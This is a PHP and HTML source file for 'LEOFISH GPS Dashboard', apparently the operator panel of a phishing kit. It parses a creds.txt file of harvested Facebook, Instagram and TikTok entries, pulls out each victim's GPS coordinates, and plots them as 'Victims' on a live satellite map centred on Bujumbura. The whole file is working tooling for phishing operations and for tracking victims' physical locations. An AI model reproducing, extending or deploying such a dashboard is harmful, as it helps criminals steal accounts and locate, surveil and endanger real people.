<?php
date_default_timezone_set('Africa/Bujumbura');

// Lire creds.txt et parser GPS
$victims = [];
if (file_exists('creds.txt')) {
    $lines = file('creds.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos($line, 'GPS POSITION') !== false) {
            // Parser GPS: "│ 📍 GPS POSITION : -3.361378,29.359912"
            if (preg_match('/📍 GPS POSITION\s*:\s*([-\d.]+),([-\d.]+)/', $line, $matches)) {
                preg_match('/(FACEBOOK|INSTAGRAM|TIKTOK)/', $line, $platform);
                $victims[] = [
                    'platform' => $platform[1] ?? 'UNKNOWN',
                    'lat' => floatval($matches[1]),
                    'lng' => floatval($matches[2]),
                    'time' => date('H:i:s'),
                    'full_line' => $line
                ];
            }
        }
    }
}

// Trier par récence
usort($victims, function($a, $b) { return strtotime($b['time']) - strtotime($a['time']); });
?>
<!DOCTYPE html>
<html>
<head>
    <title>LEOFISH GPS Dashboard</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
    <style>
    body { margin: 0; font-family: monospace; background: #0a0a0a; color: #00ff00; }
    #map { height: 70vh; width: 100%; border: 2px solid #00ff00; }
    .header { background: #000; padding: 15px; text-align: center; border-bottom: 2px solid #00ff00; }
    .stats { display: flex; justify-content: space-around; margin: 10px 0; font-size: 18px; }
    .platform { padding: 5px 10px; border-radius: 5px; margin: 2px; }
    .facebook { background: #1877f2; color: white; }
    .instagram { background: #E4405F; color: white; }
    .tiktok { background: #000; color: #ff0050; border: 1px solid #ff0050; }
    .refresh { position: fixed; top: 10px; right: 10px; background: #00ff00; color: #000; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎣 LEOFISH GPS LIVE MAP</h1>
        <div class="stats">
            <span>📍 Victims: <?php echo count($victims); ?></span>
            <span>🛰️ Satellite HD</span>
            <span id="last-update"><?php echo date('H:i:s'); ?></span>
        </div>
    </div>
    
    <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
    
    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
    <script>
    // Map satellite (OpenStreetMap + zoom max)
    var map = L.map('map', {
        zoomControl: true,
        minZoom: 2,
        maxZoom: 19
    }).setView([-3.38, 29.36], 12); // Bujumbura default

    // Tuiles satellite HD
    L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
        attribution: 'LEOFSIH GPS',
        maxZoom: 19
    }).addTo(map);

    var markers = L.markerClusterGroup({
        spiderfyOnMaxZoom: false,
        showCoverageOnHover: true,
        zoomToBoundsOnClick: true
    });

    <?php foreach ($victims as $victim): ?>
    <?php 
    $iconColor = $victim['platform'] == 'FACEBOOK' ? '#1877f2' : 
                 ($victim['platform'] == 'INSTAGRAM' ? '#E4405F' : '#ff0050');
    ?>
    L.marker([<?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?>], {
        icon: L.divIcon({
            className: 'custom-marker',
            html: '<div style="background:<?php echo $iconColor; ?>;width:25px;height:25px;border-radius:50%;border:3px solid #fff;box-shadow:0 0 10px rgba(0,255,0,0.5);"></div>',
            iconSize: [25, 25],
            iconAnchor: [12, 12]
        })
    }).bindPopup(`
        <b><?php echo $victim['platform']; ?></b><br>
        📍 GPS: <?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?><br>
        🕒 <?php echo $victim['time']; ?>
    `).addTo(markers);
    <?php endforeach; ?>

    map.addLayer(markers);

    // Auto refresh toutes les 10s
    setInterval(() => location.reload(), 100000);
    </script>
</body>
</html>
